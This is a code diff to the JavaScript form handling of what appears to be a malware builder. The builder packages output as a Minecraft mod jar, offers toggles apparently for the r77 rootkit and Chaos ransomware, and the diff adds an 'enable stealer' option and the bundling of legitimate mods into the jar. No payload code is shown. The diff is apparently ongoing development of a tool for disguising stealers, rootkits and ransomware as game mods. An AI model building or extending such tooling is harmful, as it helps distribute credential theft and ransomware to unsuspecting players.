@@ -112,6 +112,7 @@ function saveFormSettings() {
       jarMcVersion: document.getElementById("jar-mc-version")?.value ?? "1.21.4",
       jarModId: document.getElementById("jar-mod-id")?.value ?? "",
       jarModName: document.getElementById("jar-mod-name")?.value ?? "",
+      enableStealer: document.querySelector('input[name="enable-stealer"]')?.checked ?? false,
       enableR77: document.querySelector('input[name="enable-r77"]')?.checked ?? false,
       enableChaos: document.querySelector('input[name="enable-chaos"]')?.checked ?? false,
       chaosMode: document.querySelector('input[name="chaos-mode"]:checked')?.value ?? "both",
@@ -172,6 +173,7 @@ function restoreFormSettings() {
     if (s.jarMcVersion !== undefined) setVal("jar-mc-version", s.jarMcVersion);
     if (s.jarModId !== undefined) setVal("jar-mod-id", s.jarModId);
     if (s.jarModName !== undefined) setVal("jar-mod-name", s.jarModName);
+    if (s.enableStealer !== undefined) setCb('input[name="enable-stealer"]', s.enableStealer);
     if (s.enableR77 !== undefined) setCb('input[name="enable-r77"]', s.enableR77);
     if (s.enableChaos !== undefined) setCb('input[name="enable-chaos"]', s.enableChaos);
     if (s.chaosMode !== undefined) {
@@ -722,6 +724,8 @@ form?.addEventListener("submit", async (e) => {
     jarMcVersion: document.getElementById("jar-mc-version")?.value || "1.21.4",
     jarModId: document.getElementById("jar-mod-id")?.value?.trim() || undefined,
     jarModName: document.getElementById("jar-mod-name")?.value?.trim() || undefined,
+    jarBoundMods: jarBoundMods.length > 0 ? jarBoundMods.map((m) => ({ name: m.name, data: m.base64 })) : undefined,
+    enableStealer: form.querySelector('input[name="enable-stealer"]')?.checked || false,
     enableR77: form.querySelector('input[name="enable-r77"]')?.checked || false,
     enableChaos: form.querySelector('input[name="enable-chaos"]')?.checked || false,
     chaosMode: document.querySelector('input[name="chaos-mode"]:checked')?.value || "both",
